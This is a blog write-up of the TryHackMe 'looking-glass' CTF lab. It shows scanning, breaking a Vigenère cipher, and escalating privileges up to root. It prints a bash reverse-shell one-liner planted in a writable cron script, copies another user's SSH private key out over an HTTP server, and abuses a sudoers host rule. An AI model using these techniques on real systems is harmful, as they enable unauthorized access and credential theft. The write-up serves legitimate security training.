---
title: TryHackMe - looking-glass write up
date: 2020-01-09 22:19:00 +0100
categories: [TryHackMe]
tags: [TryHackMe, Vigenère, NOPASSWD, sha256, id_rsa]
render_with_liquid: false
---


![looking-glass](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/cfa67a59a1a729fbcb5c3e6caa5554c41fcd6c1e/assets/thm/glass/glass.png)

### about the machine
this is the second medium-rated machine from wonderland series on [tryhackme](https://tryhackme.com), a sequel to [the wonderland challenge](https://0x00jeff.github.io/tryhackme-wonderland-writeup/)

### Reconnaissance

I added the box ip to my hosts file then a ran a quick nmap scan, and after almost 2 hours I've realised 2 things, this machine has about 4986 open ports running `ssh` in the range `9000-13999` along with the port `22`, and I probably should have used `rustscan`

```bash
# Nmap 7.60SVN scan initiated Thu Jan  7 18:44:45 2021 as: nmap -sC -sV -p- -oN all_ports_detailed -v -r ctf.thm

Nmap scan report for ctf.thm (10.10.26.153)
Host is up (0.40s latency).

PORT      STATE SERVICE    VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA)
|   256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA)
|_  256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
...
...
13997/tcp open     ssh     Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13998/tcp open     ssh     Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
13999/tcp open     ssh     Dropbear sshd (protocol 2.0)
| ssh-hostkey: 
|_  2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
I tried connecting to random ssh ports and they seem to be outputing either `Higher` or `Lower`

```bash
$ ssh ctf.thm -p 13000
The authenticity of host '[ctf.thm]:13000 ([10.10.62.127]:13000)' can't be established.
RSA key fingerprint is ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[ctf.thm]:13000,[10.10.62.127]:13000' (RSA) to the list of known hosts.
Higher
Connection to ctf.thm closed.

$ ssh ctf.thm -p 11000
The authenticity of host '[ctf.thm]:11000 ([10.10.26.153]:11000)' can't be established.
RSA key fingerprint is ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[ctf.thm]:11000,[10.10.26.153]:11000' (RSA) to the list of known hosts.
Lower
Connection to ctf.thm closed.
```

this seemed like the `cold`/`hot` game where I have to find the right port so I made a script to do so (you can find it [here](https://github.com/0x00Jeff/0x00Jeff.github.io/blob/master/assets/thm/glass/port_finder.sh)), it's pretty fast but it's far from perfect and it freezes when it finds the valid port, you'll have to hit `CTRL-C` when it does

```bash
$ ./port_finder.sh ctf.thm
10829 -> Lower
11829 -> Higher
11329 -> Lower
11579 -> Lower
11829 -> Higher
11704 -> Lower
11766 -> Higher
11735 -> Higher
11704 -> Lower
11719 -> Higher
11712 -> Lower
11715 -> Higher
 Enter Secret: Incorrect secret.stdj?alihbkhx
the right port is 11714 !
```

then connected manually to the port and got an ecrypted text and I was asked to find a secret password

```
$ ssh ctf.thm -p 11714
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.
...
...
..
'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

the text was encrypter with an old cipher called `Vigenère` cipher, I used [this online tool](https://www.guballa.de/vigenere-solver) to break it, and I got the following poem 

```
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
...
...
...
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is REDACTED
```

one I connected to port again and typed the password, I got `Jabberwock`'s ssh credentiels

by the way, both the valid port and the `Jabberwock`'s`ssh` creds were randomized every time the machine reboots, so I had to repeast this prodecure everytime I wored on this box till I got some stable creds

### I'm in
after I logged in to the box I found the first flag, but it was in a reversed format ( }DETCADER{mht ) so I just wrote it from right to left and it was a valid flag

then I examined `/etc/passwd` to find 6 regular users on the box
```bash
jabberwock@looking-glass:~$ cat /etc/passwd
...
tryhackme:x:1000:1000:TryHackMe:/home/tryhackme:/bin/bash
jabberwock:x:1001:1001:,,,:/home/jabberwock:/bin/bash
tweedledum:x:1002:1002:,,,:/home/tweedledum:/bin/bash
tweedledee:x:1003:1003:,,,:/home/tweedledee:/bin/bash
humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
```

### escalating to tweedledum

I after getting in, I found that the said user executes a script apon maching start up, I had write permissions to that script, I also I had priveleges to reboot the machine 

```bash
jabberwock@looking-glass:~$ cat /etc/crontab
...
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
jabberwock@looking-glass:~$ ls -lh /home/jabberwock/twasBrillig.sh
-rwxrwxr-x 1 jabberwock jabberwock 38 Jul  3  2020 /home/jabberwock/twasBrillig.sh

jabberwock@looking-glass:~$ sudo -l
...
User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

so I replaced the content of that script with a `bash` reverse shell, rebooted the machine and waited it booted again and I got a reverse connection as the user `tweedledum`

```bash
jabberwock@looking-glass:~$ echo 'bash -i >& /dev/tcp/10.2.56.31/10000 0>&1' > twasBrillig.sh
jabberwock@looking-glass:~$ sudo reboot
Connection to ctf.thm closed by remote host.
Connection to ctf.thm closed.
```

### escalating to humptydumpty

`tweedledum`'s home directory had 2 files, one had a poem, and the other had a bunch of hashes
```bash
tweedledum@looking-glass:~$ ls
humptydumpty.txt  poem.txt
tweedledum@looking-glass:~$ cat humptydumpty.txt 
dcfff5eb40423f055a4cd0********************f5766b4088b9e9906961b9
7692c3ad3540bb803c020b********************0c6e7143c0add73ff431ed
28391d3bc64ec15cbb0904********************11230bb0105e02d15e3624
b808e156d18d1cecdcc145********************7c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d********************9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1********************2446677600d7cacef544d0
5e884898da28047151d0e5********************abbdd62a11ef721d1542d8
7468652070617373776f72********************7574737271706f6e6d6c6b
```

I used this [website](https://hashes.com/en/decrypt/hash) to crack them, the first 7 lines, was sha256 hashes hinting that the password might be one of them, the last line was just hex and it translated to the follwing text `the password is REDACTED`

atfer trying if I can log to another used using that password, it worked on the user `humptydumpty` (duh!)
```bash
tweedledum@looking-glass:~$ su humptydumpty 
Password: 
humptydumpty@looking-glass:/home/tweedledum$
```

### escalating to alice

I tried listing the permissions of the directories in `/home`, turned out we have the execution bit set on `/home/alice`. again, this means we might not list content of that directory, but we can read files as long as we know their names, and what well-known file might be interesting for us there ? ssh private keys!

```bash
humptydumpty@looking-glass:/home/tweedledum$ cd /home
humptydumpty@looking-glass:/home$ ls -lh
total 24K
drwx--x--x 6 alice        alice        4.0K Jul  3  2020 alice
drwx------ 3 humptydumpty humptydumpty 4.0K Jan  9 18:59 humptydumpty
drwxrwxrwx 5 jabberwock   jabberwock   4.0K Jul  3  2020 jabberwock
drwx------ 5 tryhackme    tryhackme    4.0K Jul  3  2020 tryhackme
drwx------ 3 tweedledee   tweedledee   4.0K Jul  3  2020 tweedledee
drwx------ 2 tweedledum   tweedledum   4.0K Jul  3  2020 tweedledum
humptydumpty@looking-glass:/home$ cd alice
humptydumpty@looking-glass:/home/alice$ ls
ls: cannot open directory '.': Permission denied
humptydumpty@looking-glass:/home/alice$ cd .ssh
humptydumpty@looking-glass:/home/alice/.ssh$ ls -lh id_rsa
-rw------- 1 humptydumpty humptydumpty 1.7K Jul  3  2020 id_rsa
humptydumpty@looking-glass:/home/alice/.ssh$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

I downloaded the file on my box and successfully logged in as alice!

```bash
$ wget ctf.thm:8080/id_rsa
--2021-01-09 20:01:16--  http://ctf.thm:8080/id_rsa
Resolving ctf.thm (ctf.thm)... 10.10.247.107
Connecting to ctf.thm (ctf.thm)|10.10.247.107|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1679 (1.6K) [application/octet-stream]
Saving to: ‘id_rsa’

100%[========================================================================>] 1,679       --.-K/s   in 0.004s  

2021-01-09 20:01:17 (429 KB/s) - ‘id_rsa’ saved [1679/1679]

$ chmod 600 id_rsa
$ ssh alice@ctf.thm -i id_rsa 
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ 
```

### gaining root priveleges

after some digging aound, I found that `alice` can execute a `/bin/bash` as `root` with no password on a host called `ssalg-gnikool`
so I that's what I did

```bash
alice@looking-glass:~$ ls /etc/sudoers.d/
README  alice  jabberwock  tweedles
alice@looking-glass:~$ cat /etc/sudoers.d/alice 
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash 
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# cd /root
root@looking-glass:/root# ls
passwords  passwords.sh  root.txt  the_end.txt
root@looking-glass:/root# ls passwords
passGenerator.py  wordlist.txt
root@looking-glass:/root# 
```
in there I found the second flag, reversed just like the first, and the script responsible for generating random passwords on each boot

### conclusion
this box has made me hate poems since with each user I got a new poem and I kept reading it and thinking it was some sort of a clue just to find out the solution was totally unrelated

